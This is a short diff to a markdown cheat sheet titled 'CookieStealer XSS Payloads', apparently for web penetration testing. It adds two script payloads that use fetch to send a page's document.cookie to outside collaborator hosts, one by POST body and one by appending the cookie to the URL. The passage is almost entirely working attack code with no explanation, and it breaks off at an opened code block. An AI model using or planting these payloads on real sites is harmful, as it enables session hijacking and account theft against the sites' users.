@@ -1,6 +1,22 @@
 
 # CookieStealer XSS Payloads  
 
+>Steal cookies collaborator:  
+
+```html
+<script>
+fetch(`https://burpcollaborator.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
+</script>
+```  
+
+>Steal Cookies Exploit Server:  
+
+```html
+<script>
+fetch(`https://collaborator.net/x`+document.cookie);
+</script>
+```  
+
 >XSS Cookie Stealer payloads using JavaScript
 
 ```Javascript
